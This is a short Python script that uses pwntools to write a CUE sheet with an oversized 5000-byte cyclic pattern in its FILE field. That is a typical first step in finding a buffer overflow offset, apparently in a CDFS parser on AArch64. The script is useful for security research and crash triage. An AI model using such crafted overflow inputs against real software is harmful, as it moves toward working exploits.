from pwnlib.util.cyclic import cyclic
pattern = cyclic(5000, n=8)  # AArch64 uses 8-byte units
with open("formats/cdfs/pattern.cue", "wb") as f:
    f.write(b'FILE "' + pattern + b'" BINARY\n')
    f.write(b"  TRACK 01 MODE1/2352\n")
    f.write(b"    INDEX 01 00:00:00\n")
print("Wrote formats/cdfs/pattern.cue")
